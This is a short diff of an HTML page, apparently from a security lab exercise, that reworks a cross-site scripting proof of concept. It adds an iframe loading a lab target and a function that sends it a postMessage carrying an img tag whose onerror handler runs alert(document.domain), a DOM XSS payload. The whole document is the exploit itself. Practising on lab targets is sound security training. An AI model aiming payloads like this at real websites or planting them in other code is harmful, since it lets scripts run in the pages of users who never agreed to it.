@@ -1,8 +1,11 @@
 <head></head>
 <body>
+
+<iframe onload="xss()" src="http://ptl-236ada8f-036f10c0.libcurl.so/"></iframe>
 <script>
-    window.postMessage({id:0,value:'<img src=http://test.com.jpg onerror=alert(document.domain)>'},"https://ptl-236ada8f-036f10c0.libcurl.so/");
+    function xss(){
+    const w = frames[0];
+    w.postMessage({id:0,value:'<img src=http://test.com.jpg onerror=alert(document.domain)>'},"http://ptl-236ada8f-036f10c0.libcurl.so/");
+    }
 </script>
-
-
 </body>
